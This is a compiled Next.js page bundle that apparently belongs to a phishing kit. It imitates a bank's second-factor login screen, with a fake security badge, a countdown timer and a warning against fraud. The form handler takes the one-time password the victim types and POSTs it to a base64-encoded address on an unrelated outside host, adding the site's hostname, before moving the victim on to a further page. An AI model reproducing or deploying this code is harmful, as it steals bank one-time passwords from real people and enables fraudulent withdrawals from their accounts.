(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [151], {
        4339: function(e, n, t) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/a2", function() {
                return t(754)
            }])
        },
        9018: function(e, n) {
            "use strict";
            n.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        754: function(e, n, t) {
            "use strict";
            t.r(n), t.d(n, {
                default: function() {
                    return $
                }
            });
            var a = t(7568),
                s = t(655),
                i = t(5893),
                r = t(9008),
                o = t.n(r),
                c = t(5675),
                l = t.n(c),
                u = t(7294),
                d = t(1163),
                h = t(9018);

            function $() {
                var e = (0, d.useRouter)(),
                    n = (0, u.useState)(""),
                    t = n[0];
                n[1];
                var r, c = (0, u.useState)(!1),
                    $ = c[0],
                    m = c[1],
                    f = (r = (0, a.Z)(function(n) {
                        var t, a, i, r, o, c, l;
                        return (0, s.__generator)(this, function(s) {
                            switch (s.label) {
                                case 0:
                                    return n.preventDefault(), m(!0), t = new FormData(n.target), a = {}, t.forEach(function(e, n) {
                                        a[n] = e
                                    }), i = JSON.stringify(a), r = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "application/json"
                                    }, o.body = i, o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, r)];
                                case 1:
                                    return [4, (c = s.sent()).json()];
                                case 2:
                                    return l = s.sent(), m(!1), !0 == l.status ? e.push("/a3") : m(!1), [2]
                            }
                        })
                    }), function(e) {
                        return r.apply(this, arguments)
                    }),
                    p = (0, u.useState)("03:00"),
                    x = p[0],
                    v = p[1];
                return (0, u.useEffect)(function() {
                    var e = function(n) {
                        var t = Math.floor(n / 60),
                            a = n % 60;
                        if (v((t = t < 10 ? "0" + t : t) + ":" + (a = a < 10 ? "0" + a : a)), (n -= 1) >= 0) {
                            setTimeout(function() {
                                e(n)
                            }, 1e3);
                            return
                        }
                    };
                    e(180)
                }, []), (0, i.jsxs)(i.Fragment, {
                    children: [(0, i.jsxs)(o(), {
                        children: [(0, i.jsx)("title", {
                            children: "Validate details"
                        }), (0, i.jsx)("meta", {
                            name: "description",
                            content: "Validate details"
                        }), (0, i.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, i.jsxs)("main", {
                        children: [(0, i.jsx)("div", {
                            className: "logo",
                            children: (0, i.jsx)(l(), {
                                src: "/logo.svg.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, i.jsx)("br", {}), (0, i.jsx)("div", {
                            className: "panelDiv",
                            children: (0, i.jsx)("div", {
                                className: "panel",
                                children: (0, i.jsx)("span", {
                                    children: t
                                })
                            })
                        }), (0, i.jsx)("div", {
                            className: "content_heading",
                            children: (0, i.jsx)("h3", {
                                className: "pull-left",
                                children: "Login Second Factor Authentication"
                            })
                        }), (0, i.jsxs)("div", {
                            className: "content_area",
                            children: [(0, i.jsx)("p", {
                                className: "content_title",
                                children: "Enter the One Time Password sent to your mobile phone"
                            }), (0, i.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, i.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: f,
                                children: [(0, i.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, i.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "otp1",
                                        children: [" One Time Password", (0, i.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, i.jsx)("input", {
                                        className: "form-control",
                                        id: "otp",
                                        type: "text",
                                        name: "otp1",
                                        maxLength: 8,
                                        tabIndex: "1"
                                    })]
                                }), (0, i.jsxs)("div", {
                                    className: "commonbutton",
                                    children: [(0, i.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!$,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    }), (0, i.jsx)("p", {
                                        children: x
                                    })]
                                })]
                            }), (0, i.jsx)("div", {
                                className: "common_btn",
                                children: (0, i.jsxs)("p", {
                                    children: ["If you did not receive the High Security Password on SMS, you can", (0, i.jsx)("a", {
                                        href: "#",
                                        className: "btn btn-resend",
                                        type: "button",
                                        children: "Click here to resend the OTP"
                                    })]
                                })
                            }), (0, i.jsx)("div", {
                                className: "info_panel",
                                children: (0, i.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, i.jsxs)("ul", {
                                        children: [(0, i.jsx)("li", {
                                            children: "Any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report@onlinebanking.com if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, i.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, i.jsx)("div", {
                            className: "footer_area",
                            children: (0, i.jsx)(l(), {
                                src: "/veriSign.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, i.jsx)("div", {
                            className: "footer",
                            children: (0, i.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, n, t) {
            "use strict";

            function a(e, n, t, a, s, i, r) {
                try {
                    var o = e[i](r),
                        c = o.value
                } catch (l) {
                    t(l);
                    return
                }
                o.done ? n(c) : Promise.resolve(c).then(a, s)
            }

            function s(e) {
                return function() {
                    var n = this,
                        t = arguments;
                    return new Promise(function(s, i) {
                        var r = e.apply(n, t);

                        function o(e) {
                            a(r, s, i, o, c, "next", e)
                        }

                        function c(e) {
                            a(r, s, i, o, c, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            t.d(n, {
                Z: function() {
                    return s
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 4339)
        }), _N_E = e.O()
    }
]);